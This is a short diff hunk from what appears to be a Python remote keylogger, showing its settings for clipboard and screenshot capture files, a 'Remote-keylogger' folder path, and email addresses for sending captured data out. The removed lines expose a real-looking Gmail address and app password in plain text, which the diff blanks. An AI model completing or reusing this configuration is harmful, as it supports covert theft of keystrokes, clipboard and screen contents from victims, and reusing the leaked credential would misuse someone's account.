@@ -20,9 +20,9 @@ clipboard_information = "clipboard.txt"
 screenshot_information = "screenshot.png"
 
 # Email configuration
-email_address = "gmb.gian@gmail.com"  # This email address is the one that will send the email
-password = "qzuy hext mgaj katx"  # Password of the email address
-toaddr = "gmb.gian@gmail.com"  # This email address is the one that will receive the email
+email_address = " "  # This email address is the one that will send the email
+password = " "  # Password of the email address
+toaddr = " "  # This email address is the one that will receive the email
 
 # File storage path
 file_path = "C:\\Users\\Admin\\Desktop\\Remote-keylogger"
